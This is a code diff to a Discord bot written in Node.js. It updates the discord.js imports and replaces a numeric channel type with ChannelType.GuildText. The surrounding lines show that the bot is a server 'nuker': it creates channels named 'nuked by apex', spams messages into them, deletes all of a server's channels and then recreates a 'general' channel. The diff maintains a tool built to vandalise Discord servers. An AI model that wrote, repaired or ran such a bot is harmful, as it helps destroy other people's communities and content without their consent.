@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, ActivityType } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
@@ -47,7 +47,7 @@ client.on('messageCreate', async (message) => {
       const createAndSpamChannel = async () => {
         const channel = await message.guild.channels.create({
           name: 'nuked by apex',
-          type: 0, // 0 for text channels
+          type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
         });
 
         // Spam messages in the new channel
@@ -86,7 +86,7 @@ client.on('messageCreate', async (message) => {
       // Create a "general" channel after all channels are deleted
       await message.guild.channels.create({
         name: 'general',
-        type: 0, // 0 for text channels
+        type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
       });
 
       message.channel.send('All channels have been deleted and a "general" channel has been created.');
